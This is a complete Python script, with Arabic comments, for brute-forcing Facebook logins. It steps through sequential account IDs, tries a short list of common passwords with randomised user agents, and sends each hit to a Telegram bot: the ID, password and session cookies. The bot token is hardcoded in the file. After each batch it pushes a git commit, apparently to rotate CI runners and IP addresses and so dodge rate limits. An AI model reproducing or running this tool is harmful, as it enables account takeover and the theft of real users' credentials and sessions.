import requests
import random
import time
import os
import subprocess

# 🔑 إعدادات تليجرام
TOKEN = "8295326912:AAHvVkEnCcryYxnovkD8yQawhBizJA_QE6w"
CHAT_ID = "5653032481"

PROGRESS_FILE = "progress.txt"

def get_last_id():
    if os.path.exists(PROGRESS_FILE):
        with open(PROGRESS_FILE, "r") as f:
            line = f.read().strip()
            if line: return int(line)
    return 26701173

def save_progress(current_id):
    with open(PROGRESS_FILE, "w") as f:
        f.write(str(current_id))

def send_to_tg(text):
    try: requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={'chat_id': CHAT_ID, 'text': text})
    except: pass

def get_current_ip():
    try: return requests.get('https://api.ipify.org', timeout=5).text
    except: return "Unknown"

def check_fb(uid, pas):
    uas = [
        f"Mozilla/5.0 (Linux; Android {random.randint(10,14)}; SM-A{random.randint(100,700)}F)",
        f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(16,17)}_1 like Mac OS X)",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    ]
    headers = {'User-Agent': random.choice(uas)}
    try:
        url = "https://mbasic.facebook.com/login/device-based/regular/login/"
        data = {"email": uid, "pass": pas, "login": "Log In"}
        res = requests.post(url, data=data, headers=headers, timeout=7)
        
        if "c_user" in res.cookies:
            ck = "; ".join([f"{k}={v}" for k, v in res.cookies.get_dict().items()])
            send_to_tg(f"✅ تم الصيد (OK)\n🆔: {uid}\n🔑: {pas}\n🍪: {ck}")
            return True
        elif "checkpoint" in res.url:
            send_to_tg(f"⚠️ مقفل (CP)\n🆔: {uid}\n🔑: {pas}")
            return True
    except: pass
    return False

def restart_session():
    subprocess.run("git config --global user.name 'jasser'", shell=True)
    subprocess.run("git config --global user.email 'jasser@example.com'", shell=True)
    subprocess.run("git add progress.txt", shell=True)
    subprocess.run("git commit -m '🔄 IP Rotation'", shell=True)
    subprocess.run("git push origin main", shell=True)
    exit()

def run_main():
    last_id = get_last_id()
    batch_size = 10 
    current_ip = get_current_ip()
    
    # 📢 رسالة بدء السكربت
    send_to_tg(f"🚀 بدأ السكربت الآن..\n📍 فحص الحسابات من: {last_id}\n🌐 IP الحالي: {current_ip}\n🔢 الكمية: {batch_size} حسابات في هذه الدورة")

    for i in range(batch_size):
        current_id = last_id + i
        for pas in ['123456', '12345678', 'jasser123', 'malo123', '00000000']:
            check_fb(str(current_id), pas)
        
    save_progress(last_id + batch_size)
    restart_session()

if __name__ == "__main__":
    run_main()
